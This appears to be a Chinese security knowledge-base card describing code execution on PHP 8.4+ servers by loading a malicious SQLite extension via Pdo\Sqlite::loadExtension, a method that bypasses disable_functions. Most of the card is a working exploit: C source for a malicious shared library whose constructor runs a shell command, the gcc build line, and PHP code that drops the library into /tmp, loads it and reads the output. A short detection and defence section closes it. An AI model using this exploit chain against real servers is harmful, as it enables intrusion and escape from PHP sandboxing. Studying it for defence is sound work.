---
id: web-php-rce-pdo-sqlite-loadextension
title: Pdo\Sqlite::loadExtension 加载恶意扩展库实现 RCE（PHP 8.4+）
type: scenario
domain: web
path: web/php/rce
technique: php-pdo-sqlite-loadextension-rce
aliases:
- Pdo\Sqlite loadExtension RCE
- SQLite 扩展加载 RCE
- sqlite3_extension_init 命令执行
- PDO SQLite 绕过 disable_functions
- loadExtension 加载 so
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
tags:
- php
- sqlite
- pdo
- rce
- dlopen
- extension
- disable-functions-bypass
cve: []
affected_versions: PHP >= 8.4
verification:
  verified_by: verifier-V10
  verified_at: '2026-11-05T00:50:13+08:00'
  notes: 已对照原文与截图核对 Pdo\Sqlite::loadExtension 任意路径加载、sqlite3_extension_init/构造器 C 层执行与 www-data 回显；未验证点：原文响应头为 PHP/8.3.27 与文档标注 8.4+ 存在版本出入，卡片采用文档的 PHP>=8.4，PoC 为构造器最小化改写
---

## 一句话结论

PHP 8.4 新增的 `Pdo\Sqlite::loadExtension()` 加载扩展库时不受 `sqlite3.extension_dir` 限制，可加载任意路径的恶意 `.so`；SQLite 在 `dlopen` 后调用扩展初始化函数，共享库构造器在 C 层执行命令，`disable_functions` 无法拦截。

## 原理

- SQLite 支持动态扩展：加载共享库后调用约定的 `sqlite3_extension_init()` 入口。`sqlite3_extension_init` 之前，ELF 的 `__attribute__((constructor))` 构造器已经在 `dlopen()` 阶段执行，因此即使不实现任何 SQLite 函数，也能完成命令执行。
- 旧的 `SQLite3::loadExtension()` 明确要求库位于 `sqlite3.extension_dir` 指定目录，攻击者通常无法控制该目录，利用价值有限。
- PHP 8.4 引入的 `Pdo\Sqlite::loadExtension()` 文档未提及 `sqlite3.extension_dir` 限制，实测可直接加载任意路径的库。这一差异使它成为可控的文件落地 + 任意库加载组合。
- 执行发生在 PHP 扩展调用的 C 层：`disable_functions` 只阻止 PHP 内建函数的调用分派，无法阻止共享库构造器里的 libc `system()`，因此该手法同时绕过 `disable_functions`。

## 触发条件

- PHP >= 8.4，启用 `pdo_sqlite`，且 SQLite 编译时开启动态库支持（`Dynamic Library Support: enabled`）；
- 攻击者已能执行任意 PHP 代码，并可向目标可写目录写入文件；
- 目标架构与 `.so` 编译架构一致；
- Web 进程对该路径有读取权限。

## 利用步骤

1. 编写恶意 SQLite 扩展源码，在构造器或 `sqlite3_extension_init` 中执行命令。
2. 编译为目标平台共享库。
3. 用 `file_put_contents` 把 base64 编码的 `.so` 写入可写目录，例如 `/tmp/1.so`。
4. 写入待执行命令文件（可选，便于外部控制）。
5. 通过 `new Pdo\Sqlite('sqlite::memory:')` 创建连接，调用 `loadExtension('/tmp/1.so')` 触发加载并执行。
6. 读取命令输出验证 RCE。

## PoC

恶意扩展（最小形式，构造器即可执行）：

```c
#include <sqlite3ext.h>
#include <stdlib.h>
SQLITE_EXTENSION_INIT1

__attribute__ ((constructor))
static void rce_init(void){
    system("id > /tmp/rce.out");
}

int sqlite3_extension_init(sqlite3 *db, char **pzErrMsg, const sqlite3_api_routines *pApi){
    SQLITE_EXTENSION_INIT2(pApi);
    return SQLITE_OK;
}
```

编译：

```bash
gcc -fPIC -shared -o evil.so evil.c
```

落地并加载：

```php
<?php
$so = "base64编码的so内容";
file_put_contents("/tmp/1.so", base64_decode($so));

$db = new Pdo\Sqlite('sqlite::memory:');
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$db->loadExtension('/tmp/1.so');

echo file_get_contents("/tmp/rce.out");
```

原文实测加载 `/tmp/1.so` 后成功执行 `whoami` 并读回结果。

## 变体与关联

- 若目标只有 `SQLite3` 类，可先检查 `sqlite3.extension_dir` 是否可写；否则本手法不可用。
- 与 curl `CURLOPT_SSLENGINE` 加载恶意 `.so` 同属“PHP 扩展的 dlopen 原语”，见独立卡片。
- 依赖文件落地，可与任意文件上传、日志写入、临时文件包含组合成完整链。

## 检测与防御

- 升级 PHP 后关注该 API 的后续限制；在业务代码中禁用 `Pdo\Sqlite::loadExtension` 与 `SQLite3::loadExtension`（可结合 `disable_classes` 或代码审计）。
- 禁止 Web 进程在可写目录执行 `dlopen`；对上传/临时目录挂载 `noexec` 并限制写入 `.so`。
- 监控 `dlopen` 加载非系统路径共享库、Web 进程派生子进程执行命令。
- `disable_functions` 不能覆盖 C 层调用，必须配合 OS 级隔离与最小权限运行。
